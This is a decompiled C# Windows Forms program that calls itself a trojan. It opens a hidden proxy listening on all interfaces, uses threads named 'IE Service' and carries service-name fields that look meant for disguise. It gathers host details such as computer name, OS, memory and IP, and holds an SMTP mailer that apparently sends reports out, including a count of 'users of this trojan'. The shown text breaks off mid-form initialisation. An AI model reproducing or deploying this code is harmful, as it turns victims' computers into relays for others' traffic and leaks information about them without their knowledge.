using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;
using My.Resources;

[DesignerGenerated]
public class frmMain : Form
{
	internal struct Trojan
	{
		public string MailHost;

		public string MailUser;

		public string MailPassword;

		public string MailFrom;

		public string MailSubject;

		public int MailPort;

		public int MailTimeOut;

		public string DetectIP;

		public string LesteningPorts;

		public string ServiceName;

		public string ServiceDisplayName;

		public string ServiceDescription;
	}

	protected class WebProxy : IDisposable
	{
		private struct Request
		{
			public string URL;

			public string HTTP;

			public string Host;

			public string Method;

			public string UserAgent;

			public string Accept;

			public string AcceptLanguage;

			public string AcceptEncoding;

			public string AcceptCharset;

			public string KeepAlive;

			public string ProxyConnection;

			public string Referer;

			public Cookie[] Cookies;

			public string ContentType;

			public int ContentLength;

			public string Others;
		}

		private Request __Request;

		private Socket __Socket;

		private byte[] __ReadBuffer;

		private Encoding __Encoding;

		private bool disposedValue;

		public WebProxy(Socket oSocket)
		{
			__ReadBuffer = new byte[1024];
			__Encoding = Encoding.ASCII;
			disposedValue = false;
			__Socket = oSocket;
		}

		public void Run()
		{
			try
			{
				string text = ((IPEndPoint)__Socket.RemoteEndPoint).Address.ToString();
				if (Status.IsFirtLogin(text))
				{
					SendMessage(Resources.welcome);
					modGlobal.MY_BASE.DebugLog("Welcome message sent to IP: " + text);
					return;
				}
				string sMessage = "";
				if (ReadMessage(__ReadBuffer, ref sMessage) == 0)
				{
					return;
				}
				__Request = default(Request);
				if (ParseRequest(sMessage, ref __Request))
				{
					HttpWebRequest httpWebRequest = ((Operators.CompareString(__Request.Method, "CONNECT", false) != 0) ? ((HttpWebRequest)WebRequest.Create(__Request.URL)) : ((HttpWebRequest)WebRequest.Create("https://" + __Request.URL)));
					if (!string.IsNullOrEmpty(__Request.Method))
					{
						httpWebRequest.Method = __Request.Method;
					}
					if (!string.IsNullOrEmpty(__Request.UserAgent))
					{
						httpWebRequest.UserAgent = __Request.UserAgent;
					}
					if (!string.IsNullOrEmpty(__Request.Referer))
					{
						httpWebRequest.Referer = __Request.Referer;
					}
					if (!string.IsNullOrEmpty(__Request.ContentType))
					{
						httpWebRequest.ContentType = __Request.ContentType;
					}
					if (__Request.ContentLength > 0)
					{
						httpWebRequest.ContentLength = __Request.ContentLength;
					}
					if (__Request.Cookies != null)
					{
						httpWebRequest.CookieContainer = new CookieContainer();
						Cookie[] cookies = __Request.Cookies;
						foreach (Cookie cookie in cookies)
						{
							httpWebRequest.CookieContainer!.Add(cookie);
						}
					}
					httpWebRequest.AllowAutoRedirect = true;
					using HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
					int num = 0;
					byte[] buffer = new byte[32];
					int num2 = 0;
					using Stream stream = httpWebResponse.GetResponseStream();
					num = stream.Read(buffer, 0, 32);
					while (num != 0 && __Socket.Connected)
					{
						__Socket.Send(buffer, num, SocketFlags.None);
						num2 = checked(num2 + num);
						num = stream.Read(buffer, 0, 32);
					}
					modGlobal.MY_BASE.DebugLog("Sent page: " + __Request.URL);
					modGlobal.MY_BASE.DebugLog("Page Size: " + modGlobal.MY_BASE.FormatBytes(num2));
					Status.UpDateTraffic(num2);
					return;
				}
				SendErrorPage(404, "File Not Found", "Your request:\r\n" + sMessage);
			}
			catch (FileNotFoundException ex)
			{
				ProjectData.SetProjectError((Exception)ex);
				FileNotFoundException ex2 = ex;
				SendErrorPage(404, "File Not Found", ex2.ToString());
				ProjectData.ClearProjectError();
			}
			catch (IOException ex3)
			{
				ProjectData.SetProjectError((Exception)ex3);
				IOException ex4 = ex3;
				SendErrorPage(503, "Service not available", ex4.ToString());
				ProjectData.ClearProjectError();
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				SendErrorPage(404, "File Not Found", ex6.ToString());
				modGlobal.MY_BASE.DebugLog(ex6.StackTrace);
				modGlobal.MY_BASE.DebugLog(ex6.Message);
				ProjectData.ClearProjectError();
			}
			finally
			{
				if (__Socket != null && __Socket.Connected)
				{
					__Socket.Close();
				}
			}
		}

		private void SendErrorPage(int iStatus, string sReason, string sText)
		{
			SendMessage(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Interaction.IIf(string.IsNullOrEmpty(__Request.HTTP), (object)"HTTP/1.0", (object)__Request.HTTP), (object)" "), (object)iStatus), (object)" "), (object)sReason), (object)"\r\n")));
			SendMessage("Content-Type: text/plain\r\n");
			SendMessage("Proxy-Connection: close\r\n");
			SendMessage("\r\n");
			SendMessage(Conversions.ToString(iStatus) + " " + sReason);
			SendMessage(sText);
		}

		private void SendMessage(string sMessage)
		{
			byte[] array = new byte[checked(sMessage.Length + 1)];
			int bytes = __Encoding.GetBytes(sMessage.ToCharArray(), 0, sMessage.Length, array, 0);
			__Socket.Send(array, bytes, SocketFlags.None);
		}

		private int ReadMessage(byte[] bBuffer, ref string sMessage)
		{
			int result = __Socket.Receive(bBuffer, 1024, SocketFlags.None);
			sMessage = __Encoding.GetString(bBuffer);
			return result;
		}

		private bool ParseRequest(string sData, ref Request __Request)
		{
			int try0000_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			string text = default(string);
			int num5 = default(int);
			int num6 = default(int);
			string[] array = default(string[]);
			string[] array2 = default(string[]);
			int num7 = default(int);
			bool flag = default(bool);
			string[] array3 = default(string[]);
			string[] array4 = default(string[]);
			int num8 = default(int);
			string text2 = default(string);
			string name = default(string);
			string value = default(string);
			bool flag2 = default(bool);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					checked
					{
						switch (try0000_dispatch)
						{
						default:
							ProjectData.ClearProjectError();
							num3 = -2;
							goto IL_0009;
						case 1730:
							{
								num2 = num;
								if (num3 > -2)
								{
									switch (num3)
									{
									case 1:
										break;
									default:
										goto end_IL_0000;
									}
								}
								int num4 = unchecked(num2 + 1);
								num2 = 0;
								switch (num4)
								{
								case 1:
									break;
								case 2:
									goto IL_0009;
								case 3:
									goto IL_0023;
								case 4:
									goto IL_002d;
								case 5:
									goto IL_0030;
								case 6:
									goto IL_004b;
								case 7:
									goto IL_0057;
								case 8:
									goto IL_006b;
								case 9:
									goto IL_007d;
								case 11:
								case 12:
									goto IL_0084;
								case 28:
									goto IL_00c5;
								case 29:
									goto IL_00d9;
								case 31:
									goto IL_00f5;
								case 32:
									goto IL_0109;
								case 34:
									goto IL_0125;
								case 35:
									goto IL_0139;
								case 37:
									goto IL_0155;
								case 38:
									goto IL_0169;
								case 40:
									goto IL_0185;
								case 41:
									goto IL_0199;
								case 43:
									goto IL_01b5;
								case 44:
									goto IL_01c9;
								case 46:
									goto IL_01e5;
								case 47:
									goto IL_01f9;
								case 49:
									goto IL_0215;
								case 50:
									goto IL_0229;
								case 52:
									goto IL_0245;
								case 53:
									goto IL_0259;
								case 55:
									goto IL_0275;
								case 56:
									goto IL_028c;
								case 57:
									goto IL_02b4;
								case 58:
									goto IL_02d1;
								case 59:
									goto IL_02e6;
								case 60:
									goto IL_0305;
								case 61:
									goto IL_0325;
								case 62:
									goto IL_0331;
								case 66:
									goto IL_0343;
								case 67:
									goto IL_0347;
								case 72:
									goto IL_037d;
								case 73:
									goto IL_039f;
								case 74:
									goto IL_03a5;
								case 63:
								case 65:
								case 68:
								case 70:
								case 71:
									goto IL_03ae;
								case 76:
									goto IL_03d0;
								case 77:
									goto IL_03e4;
								case 79:
									goto IL_0400;
								case 80:
									goto IL_0414;
								case 82:
									goto IL_0435;
								case 84:
								case 85:
									goto IL_044e;
								case 13:
									goto IL_0464;
								case 14:
									goto IL_0476;
								case 16:
									goto IL_0487;
								case 17:
									goto IL_0499;
								case 19:
									goto IL_04aa;
								case 20:
									goto IL_04ae;
								case 15:
								case 18:
								case 21:
								case 22:
									goto IL_04bd;
								case 23:
									goto IL_04ce;
								case 24:
									goto IL_04df;
								case 25:
									goto IL_04f9;
								case 26:
									goto IL_050a;
								case 88:
									goto IL_0523;
								case 10:
								case 27:
								case 30:
								case 33:
								case 36:
								case 39:
								case 42:
								case 45:
								case 48:
								case 51:
								case 54:
								case 75:
								case 78:
								case 81:
								case 83:
								case 86:
								case 87:
									goto IL_052c;
								case 89:
									goto end_IL_0000_2;
								default:
									goto end_IL_0000;
								case 90:
								case 91:
									goto end_IL_0000_3;
								}
								goto default;
							}
							IL_04df:
							num = 24;
							__Request.URL = text.Substring(num5, num6 - num5).Trim();
							goto IL_04f9;
							IL_04ce:
							num = 23;
							num6 = text.LastIndexOf(" ");
							goto IL_04df;
							IL_0009:
							num = 2;
							array = sData.Split(new char[1] { '\r' });
							goto IL_0023;
							IL_0023:
							num = 3;
							__Request = default(Request);
							goto IL_002d;
							IL_002d:
							num = 4;
							goto IL_0030;
							IL_0030:
							num = 5;
							array2 = array;
							num7 = 0;
							goto IL_0039;
							IL_0039:
							if (num7 >= array2.Length)
							{
								break;
							}
							text = array2[num7];
							goto IL_004b;
							IL_04f9:
							num = 25;
							num5 = text.LastIndexOf(" ");
							goto IL_050a;
							IL_004b:
							num = 6;
							text = text.Trim();
							goto IL_0057;
							IL_0057:
							num = 7;
							if (text.Contains(":"))
							{
								goto IL_006b;
							}
							goto IL_052c;
							IL_006b:
							num = 8;
							num5 = text.IndexOf(":") + 1;
							goto IL_007d;
							IL_007d:
							num = 9;
							flag = true;
							goto IL_0084;
							IL_0084:
							num = 12;
							if (flag != text.StartsWith("POST") && flag != text.StartsWith("GET") && flag != text.Contains("CONNECT"))
							{
								goto IL_00c5;
							}
							goto IL_0464;
							IL_050a:
							num = 26;
							__Request.HTTP = text.Substring(num5).Trim();
							goto IL_052c;
							IL_052c:
							num7++;
							goto IL_0523;
							IL_00c5:
							num = 28;
							if (flag == text.StartsWith("Host"))
							{
								goto IL_00d9;
							}
							goto IL_00f5;
							IL_00d9:
							num = 29;
							__Request.Host = text.Substring(num5).Trim();
							goto IL_052c;
							IL_00f5:
							num = 31;
							if (flag == text.StartsWith("User-Agent:"))
							{
								goto IL_0109;
							}
							goto IL_0125;
							IL_0109:
							num = 32;
							__Request.UserAgent = text.Substring(num5).Trim();
							goto IL_052c;
							IL_0125:
							num = 34;
							if (flag == text.StartsWith("Accept"))
							{
								goto IL_0139;
							}
							goto IL_0155;
							IL_0139:
							num = 35;
							__Request.Accept = text.Substring(num5).Trim();
							goto IL_052c;
							IL_0155:
							num = 37;
							if (flag == text.StartsWith("Accept-Language"))
							{
								goto IL_0169;
							}
							goto IL_0185;
							IL_0169:
							num = 38;
							__Request.AcceptLanguage = text.Substring(num5).Trim();
							goto IL_052c;
							IL_0185:
							num = 40;
							if (flag == text.StartsWith("Accept-Encoding"))
							{
								goto IL_0199;
							}
							goto IL_01b5;
							IL_0199:
							num = 41;
							__Request.AcceptEncoding = text.Substring(num5).Trim();
							goto IL_052c;
							IL_01b5:
							num = 43;
							if (flag == text.StartsWith("Accept-Charset"))
							{
								goto IL_01c9;
							}
							goto IL_01e5;
							IL_01c9:
							num = 44;
							__Request.AcceptCharset = text.Substring(num5).Trim();
							goto IL_052c;
							IL_01e5:
							num = 46;
							if (flag == text.StartsWith("Keep-Alive"))
							{
								goto IL_01f9;
							}
							goto IL_0215;
							IL_01f9:
							num = 47;
							__Request.KeepAlive = text.Substring(num5).Trim();
							goto IL_052c;
							IL_0215:
							num = 49;
							if (flag == text.StartsWith("Proxy-Connection"))
							{
								goto IL_0229;
							}
							goto IL_0245;
							IL_0229:
							num = 50;
							__Request.ProxyConnection = text.Substring(num5).Trim();
							goto IL_052c;
							IL_0245:
							num = 52;
							if (flag == text.StartsWith("Referer"))
							{
								goto IL_0259;
							}
							goto IL_0275;
							IL_0259:
							num = 53;
							__Request.Referer = text.Substring(num5).Trim();
							goto IL_052c;
							IL_0275:
							num = 55;
							if (flag == text.StartsWith("Cookie"))
							{
								goto IL_028c;
							}
							goto IL_03d0;
							IL_028c:
							num = 56;
							array3 = text.Substring(num5).Trim().Split(new char[1] { ';' });
							goto IL_02b4;
							IL_02b4:
							num = 57;
							array4 = array3;
							num8 = 0;
							goto IL_02bf;
							IL_02bf:
							if (num8 < array4.Length)
							{
								text2 = array4[num8];
								goto IL_02d1;
							}
							goto IL_052c;
							IL_0523:
							num = 88;
							goto IL_0039;
							IL_02d1:
							num = 58;
							if (text.Contains("="))
							{
								goto IL_02e6;
							}
							goto IL_039f;
							IL_02e6:
							num = 59;
							name = text2.Substring(0, text2.IndexOf("=")).Trim();
							goto IL_0305;
							IL_0305:
							num = 60;
							value = text2.Substring(text2.IndexOf("=") + 1).Trim();
							goto IL_0325;
							IL_0325:
							num = 61;
							if (__Request.Cookies == null)
							{
								goto IL_0331;
							}
							goto IL_0343;
							IL_0331:
							num = 62;
							__Request.Cookies = new Cookie[1];
							goto IL_03ae;
							IL_0343:
							num = 66;
							goto IL_0347;
							IL_0347:
							num = 67;
							__Request.Cookies = (Cookie[])Utils.CopyArray((Array)__Request.Cookies, (Array)new Cookie[Information.UBound((Array)__Request.Cookies, 1) + 1 + 1]);
							goto IL_03ae;
							IL_03ae:
							num = 71;
							__Request.Cookies[Information.UBound((Array)__Request.Cookies, 1)] = new Cookie(name, value);
							goto IL_037d;
							IL_037d:
							num = 72;
							__Request.Cookies[Information.UBound((Array)__Request.Cookies, 1)].Domain = __Request.Host;
							goto IL_039f;
							IL_039f:
							num8++;
							goto IL_03a5;
							IL_03a5:
							num = 74;
							goto IL_02bf;
							IL_03d0:
							num = 76;
							if (flag == text.StartsWith("Content-Type"))
							{
								goto IL_03e4;
							}
							goto IL_0400;
							IL_03e4:
							num = 77;
							__Request.ContentType = text.Substring(num5).Trim();
							goto IL_052c;
							IL_0400:
							num = 79;
							if (flag == text.StartsWith("Content-Length"))
							{
								goto IL_0414;
							}
							goto IL_0435;
							IL_0414:
							num = 80;
							__Request.ContentLength = Convert.ToInt32(text.Substring(num5).Trim());
							goto IL_052c;
							IL_0435:
							num = 82;
							if (flag != string.IsNullOrEmpty(text.Trim()))
							{
								goto IL_044e;
							}
							goto IL_052c;
							IL_044e:
							num = 85;
							__Request.Others = text.Trim();
							goto IL_052c;
							IL_0464:
							num = 13;
							if (text.StartsWith("POST"))
							{
								goto IL_0476;
							}
							goto IL_0487;
							IL_0476:
							num = 14;
							__Request.Method = "POST";
							goto IL_04bd;
							IL_0487:
							num = 16;
							if (text.StartsWith("GET"))
							{
								goto IL_0499;
							}
							goto IL_04aa;
							IL_0499:
							num = 17;
							__Request.Method = "GET";
							goto IL_04bd;
							IL_04aa:
							num = 19;
							goto IL_04ae;
							IL_04ae:
							num = 20;
							__Request.Method = "CONNECT";
							goto IL_04bd;
							IL_04bd:
							num = 22;
							num5 = text.IndexOf(" ");
							goto IL_04ce;
							end_IL_0000_2:
							break;
						}
						num = 89;
						flag2 = true;
						break;
					}
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 1730;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0000_3:
				break;
			}
			bool result = flag2;
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		protected virtual void Dispose(bool disposing)
		{
			if (disposedValue)
			{
			}
			disposedValue = true;
		}

		public void Dispose()
		{
			Dispose(disposing: true);
			GC.SuppressFinalize(this);
		}
	}

	protected class ListenPort : IDisposable
	{
		private Thread __Thread;

		private int __Port;

		private bool __IsListening;

		private TcpListener __TcpListener;

		private string __LastErr;

		private bool disposedValue;

		public string LastErr => __LastErr;

		public int Port => __Port;

		public Thread Thread => __Thread;

		public TcpListener TcpListener
		{
			get
			{
				return __TcpListener;
			}
			set
			{
				__TcpListener = value;
			}
		}

		internal bool Listening => __IsListening;

		public ListenPort(int intPort)
		{
			disposedValue = false;
			__Port = intPort;
		}

		protected override void Finalize()
		{
			if (__IsListening)
			{
				Stop();
			}
			base.Finalize();
			GC.SuppressFinalize(this);
		}

		internal void Start()
		{
			try
			{
				__TcpListener = new TcpListener(IPAddress.Any, __Port);
				__TcpListener.Start();
				__Thread = new Thread(ListenForClients);
				__Thread.Name = "IE Service " + __Port;
				__Thread.IsBackground = true;
				__Thread.Start();
				__IsListening = true;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				__LastErr = ex2.Message;
				ProjectData.ClearProjectError();
			}
		}

		internal void Stop()
		{
			try
			{
				if (!Information.IsNothing((object)__TcpListener))
				{
					__TcpListener.Stop();
					__TcpListener = null;
				}
				if (!Information.IsNothing((object)__Thread))
				{
					__Thread.Abort();
					__Thread = null;
				}
				__IsListening = false;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				__LastErr = ex2.Message;
				ProjectData.ClearProjectError();
			}
		}

		protected void ListenForClients()
		{
			while (true)
			{
				try
				{
					using Socket socket = __TcpListener.AcceptSocket();
					if (socket != null)
					{
						using WebProxy webProxy = new WebProxy(socket);
						webProxy.Run();
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					__LastErr = ex2.Message;
					ProjectData.ClearProjectError();
				}
			}
		}

		protected virtual void Dispose(bool disposing)
		{
			if (disposedValue)
			{
			}
			disposedValue = true;
		}

		public void Dispose()
		{
			Dispose(disposing: true);
			GC.SuppressFinalize(this);
		}
	}

	protected class Mail
	{
		private string __Host;

		private string __UserName;

		private string __Password;

		private int __Port;

		private int __Timeout;

		public string Host
		{
			get
			{
				return __Host;
			}
			set
			{
				__Host = value;
			}
		}

		public string UserName
		{
			get
			{
				return __UserName;
			}
			set
			{
				__UserName = value;
			}
		}

		public string Password
		{
			get
			{
				return __Password;
			}
			set
			{
				__Password = value;
			}
		}

		public int Port
		{
			get
			{
				return __Port;
			}
			set
			{
				__Port = value;
			}
		}

		public int Timeout
		{
			get
			{
				return __Timeout;
			}
			set
			{
				__Timeout = value;
			}
		}

		public Mail(string sHost, string sUserName = "", string sPassword = "", int iPort = 587, int iTimeout = 60)
		{
			__Host = sHost;
			__UserName = sUserName;
			__Password = sPassword;
			__Port = iPort;
			__Timeout = iTimeout;
		}

		public bool SendMail(string sFrom, string sTO, string sSubject, string sBody, params string[] sHeaders)
		{
			checked
			{
				bool result = default(bool);
				try
				{
					MailMessage mailMessage = new MailMessage();
					MailAddress from = new MailAddress(sFrom);
					MailAddress item = new MailAddress(sTO);
					mailMessage.From = from;
					mailMessage.To.Add(item);
					mailMessage.Subject = sSubject;
					mailMessage.Body = sBody;
					if (!Information.IsNothing((object)sHeaders) && Information.UBound((Array)sHeaders, 1) > 0)
					{
						int num = Information.LBound((Array)sHeaders, 1);
						int num2 = Information.UBound((Array)sHeaders, 1) - 1;
						for (int i = num; i <= num2; i++)
						{
							mailMessage.Headers.Add(sHeaders[i], sHeaders[i + 1]);
						}
					}
					SmtpClient smtpClient = new SmtpClient();
					if (!string.IsNullOrEmpty(__UserName) & !string.IsNullOrEmpty(__Password))
					{
						smtpClient.UseDefaultCredentials = false;
						smtpClient.Credentials = new NetworkCredential(__UserName, __Password);
					}
					smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
					smtpClient.Host = __Host;
					smtpClient.Port = __Port;
					smtpClient.Timeout = __Timeout * 1000;
					smtpClient.EnableSsl = true;
					smtpClient.Send(mailMessage);
					mailMessage = null;
					from = null;
					item = null;
					smtpClient = null;
					result = true;
					return result;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}
	}

	protected class Status
	{
		private static Hashtable __LoggedInfo = new Hashtable();

		private static long __TotalBytes;

		[DebuggerNonUserCode]
		public Status()
		{
		}

		public static bool IsFirtLogin(string sIP)
		{
			if (__LoggedInfo.Contains(sIP))
			{
				return false;
			}
			__LoggedInfo.Add(sIP, sIP);
			return true;
		}

		public static void Clear()
		{
			__LoggedInfo = new Hashtable();
		}

		public static int TotalIP()
		{
			return __LoggedInfo.Count;
		}

		public static string ProxyUsers()
		{
			string text = "";
			IDictionaryEnumerator enumerator = __LoggedInfo.GetEnumerator();
			while (enumerator.MoveNext())
			{
				string text2 = Conversions.ToString(enumerator.Current);
				text = text + text2 + "\r\n";
			}
			return text;
		}

		public static void UpDateTraffic(int intBytes)
		{
			checked
			{
				__TotalBytes++;
			}
		}

		public static string GetTotalTraffic()
		{
			return modGlobal.MY_BASE.FormatBytes(__TotalBytes);
		}
	}

	protected class UserInfo
	{
		public static bool IP
		{
			get
			{
				return Conversions.ToBoolean(modGlobal.MY_IP_ADDRESS);
			}
			set
			{
				modGlobal.MY_IP_ADDRESS = Conversions.ToString(value);
			}
		}

		public static string ComputerName => ((ServerComputer)MyProject.Computer).get_Name();

		public static string OSUpTime
		{
			get
			{
				//IL_0016: Unknown result type (might be due to invalid IL or missing references)
				//IL_001c: Expected O, but got Unknown
				int try0000_dispatch = -1;
				int num3 = default(int);
				int num2 = default(int);
				int num = default(int);
				TimeSpan timeSpan = default(TimeSpan);
				PerformanceCounter val = default(PerformanceCounter);
				string text = default(string);
				while (true)
				{
					try
					{
						/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
						switch (try0000_dispatch)
						{
						default:
							ProjectData.ClearProjectError();
							num3 = -2;
							goto IL_0009;
						case 186:
							{
								num2 = num;
								if (num3 > -2)
								{
									switch (num3)
									{
									case 1:
										break;
									default:
										goto end_IL_0000;
									}
								}
								int num4 = num2 + 1;
								num2 = 0;
								switch (num4)
								{
								case 1:
									break;
								case 2:
									goto IL_0009;
								case 3:
									goto IL_001c;
								case 4:
									goto IL_0026;
								case 5:
									goto end_IL_0000_2;
								default:
									goto end_IL_0000;
								case 6:
									goto end_IL_0000_3;
								}
								goto default;
							}
							IL_0026:
							num = 4;
							timeSpan = TimeSpan.FromSeconds(val.NextValue());
							break;
							IL_001c:
							num = 3;
							val.NextValue();
							goto IL_0026;
							IL_0009:
							num = 2;
							val = new PerformanceCounter("System", "System Up Time");
							goto IL_001c;
							end_IL_0000_2:
							break;
						}
						num = 5;
						text = timeSpan.Days + " day(s), " + timeSpan.Hours + " hour(s), " + timeSpan.Minutes + " minute(s)";
						break;
						end_IL_0000:;
					}
					catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
					{
						ProjectData.SetProjectError((Exception)obj);
						try0000_dispatch = 186;
						continue;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					continue;
					end_IL_0000_3:
					break;
				}
				string result = text;
				if (num2 != 0)
				{
					ProjectData.ClearProjectError();
				}
				return result;
			}
		}

		public static string OSFullName => ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName();

		public static string OSVersion => ((ServerComputer)MyProject.Computer).get_Info().get_OSVersion();

		public static string TotalVirtualMemory => Conversions.ToString(((ServerComputer)MyProject.Computer).get_Info().get_TotalVirtualMemory());

		public static string TotalPhysicalMemory => Conversions.ToString(((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory());

		public static string UICulture => ((ServerComputer)MyProject.Computer).get_Info().get_InstalledUICulture().ToString();

		[DebuggerNonUserCode]
		public UserInfo()
		{
		}

		public static string ToString(bool b)
		{
			StringBuilder stringBuilder = new StringBuilder();
			lock (modGlobal.MY_IP_ADDRESS)
			{
				stringBuilder.AppendLine("Web Report IP: " + modGlobal.MY_IP_ADDRESS);
			}
			stringBuilder.AppendLine("Machine Report IP: " + GetMyIP());
			stringBuilder.AppendLine("Pr0xy lestening ports: " + modGlobal.MY_BASE.__Settings.LesteningPorts);
			stringBuilder.AppendLine("---------------------------------------");
			stringBuilder.AppendLine("Computer Name: " + ComputerName);
			stringBuilder.AppendLine("OS Full Name: " + OSFullName);
			stringBuilder.AppendLine("OS Version: " + OSVersion);
			stringBuilder.AppendLine("OS UpTime: " + OSUpTime);
			stringBuilder.AppendLine("UI Culture: " + UICulture);
			stringBuilder.AppendLine("Date/Time: " + DateAndTime.get_Now());
			stringBuilder.AppendLine("Total Virtual Memory: " + modGlobal.MY_BASE.FormatBytes(Conversions.ToDouble(TotalVirtualMemory)));
			stringBuilder.AppendLine("Total Physical Memory: " + modGlobal.MY_BASE.FormatBytes(Conversions.ToDouble(TotalPhysicalMemory)));
			stringBuilder.AppendLine("---------------------------------------");
			stringBuilder.AppendLine("Total traffic released: " + Status.GetTotalTraffic());
			if (b)
			{
				stringBuilder.AppendLine("Total Users (IP) used this trojan: " + Conversions.ToString(Status.TotalIP()));
				stringBuilder.AppendLine("IP's: " + Status.ProxyUsers());
			}
			return stringBuilder.ToString();
		}

		private static string GetMyIP()
		{
			try
			{
				string text = Dns.GetHostAddresses(((ServerComputer)MyProject.Computer).get_Name())[0].ToString();
				if (!string.IsNullOrEmpty(text))
				{
					return text;
				}
				return Dns.GetHostAddresses(((ServerComputer)MyProject.Computer).get_Name())[1].ToString();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				modGlobal.MY_BASE.DebugLog(ex2.StackTrace);
				modGlobal.MY_BASE.DebugLog(ex2.Message);
				string message = ex2.Message;
				ProjectData.ClearProjectError();
				return message;
			}
		}
	}

	private IContainer components;

	[AccessedThroughProperty("btnStart")]
	private Button _btnStart;

	[AccessedThroughProperty("btnStop")]
	private Button _btnStop;

	[AccessedThroughProperty("btnExit")]
	private Button _btnExit;

	[AccessedThroughProperty("lstDebug")]
	private ListBox _lstDebug;

	[AccessedThroughProperty("mnuLog")]
	private ContextMenuStrip _mnuLog;

	[AccessedThroughProperty("mnuClearLog")]
	private ToolStripMenuItem _mnuClearLog;

	[AccessedThroughProperty("tmrStatus")]
	private Timer _tmrStatus;

	[AccessedThroughProperty("chkTopMost")]
	private CheckBox _chkTopMost;

	internal Trojan __Settings;

	private string[] LISTENING_PORTS;

	private ListenPort[] __LISTEN_PORT;

	private RegistryKey Reg;

	[SpecialName]
	private byte _0024STATIC_0024tmrStatus_Tick_002420211C123D_0024bytTick;

	internal virtual Button btnStart
	{
		[DebuggerNonUserCode]
		get
		{
			return _btnStart;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_btnStart = value;
		}
	}

	internal virtual Button btnStop
	{
		[DebuggerNonUserCode]
		get
		{
			return _btnStop;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_btnStop = value;
		}
	}

	internal virtual Button btnExit
	{
		[DebuggerNonUserCode]
		get
		{
			return _btnExit;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_btnExit = value;
		}
	}

	internal virtual ListBox lstDebug
	{
		[DebuggerNonUserCode]
		get
		{
			return _lstDebug;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lstDebug = value;
		}
	}

	internal virtual ContextMenuStrip mnuLog
	{
		[DebuggerNonUserCode]
		get
		{
			return _mnuLog;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_mnuLog = value;
		}
	}

	internal virtual ToolStripMenuItem mnuClearLog
	{
		[DebuggerNonUserCode]
		get
		{
			return _mnuClearLog;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_mnuClearLog = value;
		}
	}

	internal virtual Timer tmrStatus
	{
		[DebuggerNonUserCode]
		get
		{
			return _tmrStatus;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = tmrStatus_Tick;
			if (_tmrStatus != null)
			{
				_tmrStatus.remove_Tick(eventHandler);
			}
			_tmrStatus = value;
			if (_tmrStatus != null)
			{
				_tmrStatus.add_Tick(eventHandler);
			}
		}
	}

	internal virtual CheckBox chkTopMost
	{
		[DebuggerNonUserCode]
		get
		{
			return _chkTopMost;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_chkTopMost = value;
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_047f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0489: Expected O, but got Unknown
		components = new Container();
		btnStart = new Button();
		btnStop = new Button();
		btnExit = new Button();
